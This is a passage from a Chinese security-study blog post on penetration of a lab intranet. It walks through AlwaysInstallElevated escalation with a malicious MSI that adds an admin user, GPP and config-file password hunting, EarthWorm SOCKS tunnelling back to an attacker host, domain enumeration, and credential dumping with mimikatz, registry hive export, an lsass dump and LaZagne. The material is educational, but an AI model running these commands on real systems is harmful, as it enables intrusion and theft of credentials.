+<pre class="line-numbers language-none"><code class="language-none">import-module powerup.ps1
+get-registryAlwaysInstallElevated   &#x2F;&#x2F;若返回true则可以继续利用
+write-useraddmsi                    &#x2F;&#x2F;生成恶意msi文件
+useradd.msi，msiexec &#x2F;q &#x2F;i useradd.msi &#x2F;&#x2F;以普通权限运行命令，会添加一个管理员用户<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+<p><strong>配置文件窃取</strong><br>网络管理员配置时的配置文件，可能存在密码等信息。主要是搜索文件系统来查找常见的敏感文件。</p>
+<pre class="line-numbers language-none"><code class="language-none">dir &#x2F;b &#x2F;s c:Unattend.xml
+C:\Users\user\Desktop&gt; dir C:\*vnc.ini &#x2F;s &#x2F;b &#x2F;c
+C:\Users\user\Desktop&gt; dir C:\ &#x2F;s &#x2F;b &#x2F;c | findstr &#x2F;sr \*password\*
+...<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+<pre class="line-numbers language-none"><code class="language-none">使用msf
+msf5 &gt; post&#x2F;windows&#x2F;gather&#x2F;enum_unattend<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+<p><strong>GPP（组策略首选项）</strong></p>
+<p><strong>组策略首选项</strong><br>管理员在域中新建策略后，会在SYSVOL共享目录中生成XML文件，保存着密码等敏感信息。</p>
+<pre class="line-numbers language-none"><code class="language-none">powersploit框架（类似于nishang框架，也是一款后渗透神器）
+首先下载powersploit框架后，进入目录打开命令窗口
+import-module powersploit.psm1  &#x2F;&#x2F;导入powersploit
+get-command                     &#x2F;&#x2F;获取导入后可用的攻击模块
+get-gpppassword                 &#x2F;&#x2F;这个模块可以可以查询相关GPP信息<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<pre class="line-numbers language-none"><code class="language-none">使用msf
+msf5 &gt; use post&#x2F;windows&#x2F;gather&#x2F;credentials&#x2F;gpp<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+<h4 id="Ⅴ-其他应用提权"><a href="#Ⅴ-其他应用提权" class="headerlink" title="Ⅴ 其他应用提权"></a>Ⅴ 其他应用提权</h4><p>其他应用主要是拿到webshell后进行数据库提权，比如mysql、mssql等，或者目标主机上的其他应用。</p>
+<h3 id="0x04-隧道搭建"><a href="#0x04-隧道搭建" class="headerlink" title="0x04 隧道搭建"></a>0x04 隧道搭建</h3><p>隧道的搭建是内网渗透中必不可少的一环，利用打通的隧道，攻击者可以通过内网边缘主机进入内网环境，实施进一步的攻击。<br>在一开始的内网架构说明中，我们的win7（10.188.16.131）位于边缘部分，我们拿下以后，将以此为跳板进入内网实施攻击。总结的脑图如下（我们接下来将讲述图中几种隧道搭建的方式）：<br><img src="/images/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E2%91%A0/7.png" alt="图片"></p>
+<h4 id="代理工具（linux-gt-proxychains-windows-gt-proxifier）-ew（socks）"><a href="#代理工具（linux-gt-proxychains-windows-gt-proxifier）-ew（socks）" class="headerlink" title="代理工具（linux-&gt;proxychains/windows-&gt;proxifier）+ew（socks）"></a>代理工具（linux-&gt;proxychains/windows-&gt;proxifier）+ew（socks）</h4><p><strong>linux下的proxychains+ew（earthworm）</strong><br><strong>目标：</strong><br>在目标机器win7（10.188.16.131和192.168.174.119）上使用ew转发到我们的攻击机kali的8888端口（10.188.10.200）；<br>然后我们在kali上使用ew将win7转发过来的流量映射到本地的1080端口，之后我们使用proxychains代理访问本地的1080端口，那么流量就会从kali的1080到kali的8888再到win7主机。<br>即：10.188.10.200:1080-&gt;10.188.10.200:8888-&gt;10.188.16.131<br><strong>操作：</strong><br>1.下载linux和windows下的ew（earthworm），并上传到kali和win7；<br>2.在linux上安装proxychains，并进行配置；</p>
+<pre class="line-numbers language-none"><code class="language-none">sudo apt-get install proxychains4   &#x2F;&#x2F;安装proxychains4
+vi &#x2F;etc&#x2F;proxychains.conf            &#x2F;&#x2F;设置配置文件，具体内容下文给出
+&#x2F;*proxychains.conf内容：第一步：proxy_dns前面加“#”，将其注释；第二步：在[proxylist]下面只留下“socks5  127.0.0.1 1080”这一行。配置完成，保存退出。*&#x2F;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+<p><img src="/images/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E2%91%A0/8.png" alt="图片"><br>3.在win7和kali依次使用ew：</p>
+<pre class="line-numbers language-none"><code class="language-none">.&#x2F;ew_for_Linux -s rcsocks -l 1080 -e 8888     &#x2F;&#x2F;kali上执行
+ew_for_Win.exe -s rssocks -d 10.188.10.200 -e 8888  &#x2F;&#x2F;win7上执行
+之后就可以在kali上使用proxychain4来访问了。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+<p><img src="/images/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E2%91%A0/9.png" alt="图片"><br><img src="/images/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E2%91%A0/10.png" alt="图片"><br>4.用proxychains4和nmap扫描。</p>
+<pre class="line-numbers language-none"><code class="language-none">proxychains4 nmap 192.168.174.119 -Pn
+(之前不能访问这个网段，但是经过隧道后可以访问了)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+<p>PS：还可以使用ew进行多级代理，有兴趣的读者可以自行学习。</p>
+<h4 id="windwos下的proxifier-ew（earthworm）"><a href="#windwos下的proxifier-ew（earthworm）" class="headerlink" title="windwos下的proxifier+ew（earthworm）"></a>windwos下的proxifier+ew（earthworm）</h4><p>这种情况是适用于攻击机不是linux而是windows系统时，其中ew的操作相同，只有proxychains换为了windows下的proxifier。<br>因此，我们主要介绍proxifier的使用。<br><strong>proxifier使用</strong><br>1.下载后安装；<br>2.启动ew；<br>3.启动proxifier后，添加代理服务和代理规则；<br><img src="/images/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E2%91%A0/11.png" alt="图片"><br><img src="/images/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E2%91%A0/12.png" alt="图片"><br><img src="/images/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E2%91%A0/13.png" alt="图片"><br>之后使用chrome就可以访问192.168.174.119的服务器。</p>
+<h4 id="关于其他方式的说明"><a href="#关于其他方式的说明" class="headerlink" title="关于其他方式的说明"></a>关于其他方式的说明</h4><p>除了ew以外，其他隧道搭建工具比如nc（netcat）、lcx、reGeorg等等都可以使用，我这里只是提供了一种方式。感兴趣的读者可以根据之前给出的隧道搭建的脑图自行学习。</p>
+<h3 id="0x05-信息搜集2"><a href="#0x05-信息搜集2" class="headerlink" title="0x05 信息搜集2"></a>0x05 信息搜集2</h3><p>在提权和隧道做好以后，我们接下来将正式第一次从内网边缘向内网内部“窥探”。第二次的信息搜集主要需要对内网主机进行探测，另外需要对域信息进行搜集，包括：域内用户信息，域控信息，NTLM hash等等，目的是为接下来的横向渗透做基础。</p>
+<h4 id="林"><a href="#林" class="headerlink" title="林"></a>林</h4><p>林是域的集合，多个域组成了林。比方说，xxx北京分公司在一个域，xxx上海分公司在另外一个域，而这两个域又在同一个林中，方便了管理。</p>
+<h4 id="域环境"><a href="#域环境" class="headerlink" title="域环境"></a>域环境</h4><p>域是区别于工作组的，为了方便管理和有效区分各个部门域，常见于企业公司中。</p>
+<p>域的体系结构中最重要的是域控（DC），域控是装有活动目录（AD）的计算机，域控可以通过LDAP查询AD控制域内的所有内容，并加以控制。一个域内可以有多台域控，每台域控有独立的AD；</p>
+<p>活动目录（AD）：Active Directory是微软对目录服务数据库的实现，AD存储了有关域内对象的信息，方便管理员和用户可以查找并使用这些信息。其中通过LDAP（轻量级目录访问协议）来访问AD；</p>
+<p>Naming Context和Application Partitions：Naming Context是Active Directory的分区，分区的主要目的是在有多台域控的时候，每台域控只需要复制其他域控某些分区的内容即可，减少了工作量。三个默认存在的Naming Context是：Configuration NC(Configuration NC)、Schema NC(Schema NC)、Domain NC(DomainName NC)。在之后，微软允许用户自定义分区来扩展Naming Context，这就是Application Partitions。两个预置的是：DomainDnsZones和ForestDnsZones；</p>
+<p>域环境下的用户：使用用户名以及密码通过域控制器进行验证，可以在同一域内的任何一台计算机登陆。其中管理员用户又称为域管，这里的域管理员用户与域控本机的管理员其实是分开的，但是他们的密码是相同的；</p>
+<p>域内的组：用户是属于组的。组按照用途分为通讯组和安全组，其中安全组是权限的集合，如果需要赋予某个用户某种权限，那就可以将这个用户加入对应的组。安全组又分为域本地组、通用组和全局组。<br>常见的域本地组是Administrators，它具备系统管理员的权限，拥有对整个域最大的控制权。<br>常见的通用组是Enterprise Admins，在林中，只有林根域才有这个组，林中其他域没有这个组，但其他域默认会把这个组加入到本域的Administrators里面去。<br>常见的全局组是Domain Admins，也就是域管组。其中Administrators包括Domain Admins和Enterprise Admins；</p>
+<p>域内的组织单位（OU）：Organization Unit是专用容器，区别于普通容器的一点是OU受组策略的控制，它与组完全不同：组是权限的集合，而组织单位是被管理者的集合。组织单位包括：用户，计算机，工作组，其他组织单位等；</p>
+<p>组策略：组策略可以控制本机和域内的用户以及他们的操作。组策略分为本机组策略和域的组策略，其中本机组策略用于计算机管理员管理本机所有用户，而域的组策略用于域管对于域内用户的控制。在后面我们会介绍通过组策略设置后门；</p>
+<p>这是最后总结的图：<br><img src="/images/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E2%91%A0/14.png" alt="图片"></p>
+<h4 id="搜集相关"><a href="#搜集相关" class="headerlink" title="搜集相关"></a>搜集相关</h4><p><strong>基础</strong></p>
+<pre class="line-numbers language-none"><code class="language-none">最主要目的是确认自己所处的是哪个域，以及域控的位置。
+域控一般是本机的DNS服务器。
+ipconfig &#x2F;all
+net time &#x2F;domain
+    &#x2F;*1. 找不到域控制器:处于工作组，不存在域；
+    2. 发生错误,拒绝访问:存在域，不是域用户；
+    3. 查询成功:存在域，是域用户；*&#x2F;
+net view &#x2F;domain
+net user &#x2F;domain
+net group &#x2F;domain
+net group &quot;domain admins&quot; &#x2F;domain
+net group &quot;domain computers&quot; &#x2F;domain
+net group &quot;domain controllers&quot; &#x2F;domain
+net accounts &#x2F;domain
+net config workstation
+wmic useraccount get &#x2F;all
+net loaclgroup [administrator]
+nltest &#x2F;domain_trusts &#x2F;all_trusts &#x2F;v &#x2F;server:域控IP<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p><strong>端口、存活主机探测</strong></p>
+<pre class="line-numbers language-none"><code class="language-none">nbtscan.exe 192.168.52.0&#x2F;24 &#x2F;&#x2F;内网存活主机探测
+---
+use auxiliary&#x2F;scanner&#x2F;portscan&#x2F;tcp  &#x2F;&#x2F;端口扫描，msf和其他下面的框架还有其他收集信息的模块，也都可以尝试。
+---
+PowerSploit：Invoke-Portscan.ps1
+---
+powerview：Invoke-userhunter&#x2F;Invoke-processhunter
+---
+Nishang：Invoke-PortScan
+---
+PsLoggedon.exe      &#x2F;&#x2F;查询谁登陆过机器
+---
+PVEFindADUser.exe   &#x2F;&#x2F;枚举域用户以及登陆过特定系统的用户
+---
+BloodHound          &#x2F;&#x2F;内网域渗透提权综合分析工具
+---
+除此以外还有其他许多方法，读者可以自行探索、留言交流。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p><strong>密码获取</strong></p>
+<pre class="line-numbers language-none"><code class="language-none">密码的获取是重中之重，关系到我们下一步横向渗透，
+比如说利用pth、ptt、金票据、银票据、AS-REP Roasting和ntlm-relay等等的实现以及原理都放到下一篇文章中讲解。
+
+神器mimikatz（msf也有内置的mimikatz模块）：
+    privilege::debug
+    sekurlsa::logonpasswords
+目前mimikatz一般会报毒，所以推荐将保存在注册表中的密码信息导出，传到本地再用mimikatz：
+    reg save HKLM\SYSTEM C:\windows\temp\Sys.hiv    &#x2F;&#x2F;cmd命令导出Sys.hiv文件
+    reg save HKLM\SAM C:\windows\temp\Sam.hiv       &#x2F;&#x2F;cmd命令导出Sam.hiv文件
+    lsadump::sam &#x2F;sam:Sam.hiv &#x2F;system:Sys.hiv           &#x2F;&#x2F;mimikatz解密
+读取内从中密码：
+    procdump.exe -accepteula -ma lsass.exe lsass.dmp        &#x2F;&#x2F;导出文件下载到本地
+    mimikatz.exe &quot;sekurlsa::minidump lsass.dmp&quot; &quot;log&quot; &quot;sekurlsa::logonpasswords&quot;      &#x2F;&#x2F;本地mimikatz解密
+LaZagne工具可以读取机器内的浏览器、SSH等保存的密码。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<h3 id="0x06-参考文章"><a href="#0x06-参考文章" class="headerlink" title="0x06 参考文章"></a>0x06 参考文章</h3><p><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/221264#h3-14">https://www.anquanke.com/post/id/221264#h3-14</a><br>感谢大佬的文章！</p>
+
+    </div>
+
+    
+    
+    
+<div>
+  
+    <div>
+    
+        <div style="text-align:center;color: #ccc;font-size:14px;">-------------本文结束<i class="fa fa-paw"></i>感谢您的阅读-------------</div>
+    
+</div>
+
+  
+</div>
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/2021-11/" rel="tag"><i class="fa fa-tag"></i> 2021.11</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2021/05/05/ApacheSolr%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" rel="prev" title="【Apache】Apache Solr任意文件读取漏洞复现">
+      <i class="fa fa-chevron-left"></i> 【Apache】Apache Solr任意文件读取漏洞复现
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2021/11/07/GitLab%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" rel="next" title="【CVE-2021-22205】GitLab 远程命令执行漏洞复现">
+      【CVE-2021-22205】GitLab 远程命令执行漏洞复现 <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#0x00-%E6%9C%AC%E6%96%87%E9%A1%BA%E5%BA%8F"><span class="nav-number">1.</span> <span class="nav-text">0x00 本文顺序</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x01-%E5%86%85%E7%BD%91%E6%9E%B6%E6%9E%84%E5%8F%8A%E5%8F%8D%E5%BC%B9shell"><span class="nav-number">2.</span> <span class="nav-text">0x01 内网架构及反弹shell</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E2%85%A0-%E5%86%85%E7%BD%91%E7%8E%AF%E5%A2%83"><span class="nav-number">2.1.</span> <span class="nav-text">Ⅰ 内网环境</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E2%85%A1-msf%E5%8F%8D%E5%BC%B9shell"><span class="nav-number">2.2.</span> <span class="nav-text">Ⅱ msf反弹shell</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x02-%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%861"><span class="nav-number">3.</span> <span class="nav-text">0x02 信息搜集1</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x03-%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83"><span class="nav-number">4.</span> <span class="nav-text">0x03 本地提权</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E2%85%A0-%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E6%8F%90%E6%9D%83"><span class="nav-number">4.1.</span> <span class="nav-text">Ⅰ 溢出漏洞提权</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E2%85%A1-ByPassUAC"><span class="nav-number">4.2.</span> <span class="nav-text">Ⅱ ByPassUAC</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E2%85%A2-%E4%BB%A4%E7%89%8C%E7%AA%83%E5%8F%96"><span class="nav-number">4.3.</span> <span class="nav-text">Ⅲ 令牌窃取</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E2%85%A3-%E7%B3%BB%E7%BB%9F%E9%85%8D%E7%BD%AE%E9%94%99%E8%AF%AF%E6%8F%90%E6%9D%83"><span class="nav-number">4.4.</span> <span class="nav-text">Ⅳ 系统配置错误提权</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E2%85%A4-%E5%85%B6%E4%BB%96%E5%BA%94%E7%94%A8%E6%8F%90%E6%9D%83"><span class="nav-number">4.5.</span> <span class="nav-text">Ⅴ 其他应用提权</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x04-%E9%9A%A7%E9%81%93%E6%90%AD%E5%BB%BA"><span class="nav-number">5.</span> <span class="nav-text">0x04 隧道搭建</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E4%BB%A3%E7%90%86%E5%B7%A5%E5%85%B7%EF%BC%88linux-gt-proxychains-windows-gt-proxifier%EF%BC%89-ew%EF%BC%88socks%EF%BC%89"><span class="nav-number">5.1.</span> <span class="nav-text">代理工具（linux-&gt;proxychains&#x2F;windows-&gt;proxifier）+ew（socks）</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#windwos%E4%B8%8B%E7%9A%84proxifier-ew%EF%BC%88earthworm%EF%BC%89"><span class="nav-number">5.2.</span> <span class="nav-text">windwos下的proxifier+ew（earthworm）</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%85%B3%E4%BA%8E%E5%85%B6%E4%BB%96%E6%96%B9%E5%BC%8F%E7%9A%84%E8%AF%B4%E6%98%8E"><span class="nav-number">5.3.</span> <span class="nav-text">关于其他方式的说明</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x05-%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%862"><span class="nav-number">6.</span> <span class="nav-text">0x05 信息搜集2</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%9E%97"><span class="nav-number">6.1.</span> <span class="nav-text">林</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%9F%9F%E7%8E%AF%E5%A2%83"><span class="nav-number">6.2.</span> <span class="nav-text">域环境</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%90%9C%E9%9B%86%E7%9B%B8%E5%85%B3"><span class="nav-number">6.3.</span> <span class="nav-text">搜集相关</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x06-%E5%8F%82%E8%80%83%E6%96%87%E7%AB%A0"><span class="nav-number">7.</span> <span class="nav-text">0x06 参考文章</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="DMKXY"
+      src="/images/avatar.gif">
+  <p class="site-author-name" itemprop="name">DMKXY</p>
+  <div class="site-description" itemprop="description">这是一个用来学安全的博客</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">11</span>
+          <span class="site-state-item-name">文章</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">10</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">7</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/DMKXY" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;DMKXY" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="/acdmkxy@qq.com" title="E-Mail → acdmkxy@qq.com"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="https://weibo.com/5621985219" title="Weibo → https:&#x2F;&#x2F;weibo.com&#x2F;5621985219" rel="noopener" target="_blank"><i class="fab fa-weibo fa-fw"></i>Weibo</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="tencent://" title="QQ → tencent:&#x2F;&#x2F;" rel="noopener" target="_blank"><i class="fab fa-qq fa-fw"></i>QQ</a>
+      </span>
+  </div>
+
+
+  <div class="links-of-blogroll motion-element">
+    <div class="links-of-blogroll-title"><i class="fa fa-link fa-fw"></i>
+      Links
+    </div>
+    <ul class="links-of-blogroll-list">
+        <li class="links-of-blogroll-item">
+          <a href="https://www.lele8.me/" title="https:&#x2F;&#x2F;www.lele8.me&#x2F;" rel="noopener" target="_blank">回梦's Blog</a>
+        </li>
+    </ul>
+  </div>
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2021</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">DMKXY</span>
+</div>
+
+
+    <script async src="//dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+    <span id="busuanzi_container_site_pv">总访问量<span id="busuanzi_value_site_pv"></span>次</span>
+    <span class="post-meta-divider">|</span>
+    <span id="busuanzi_container_site_uv">总访客<span id="busuanzi_value_site_uv"></span>人</span>
+    <span class="post-meta-divider">|</span>
+
+
+
+<!--
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
+  </div>
+--><script color="143,7,131" opacity="0.8" zIndex="-1" count="99" src="https://cdn.jsdelivr.net/npm/canvas-nest.js@1/dist/canvas-nest.js"></script>
+
+<div class="theme-info">
+  <div class="powered-by"></div>
+  <span class="post-count">博客全站共15.6k字</span>
+</div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
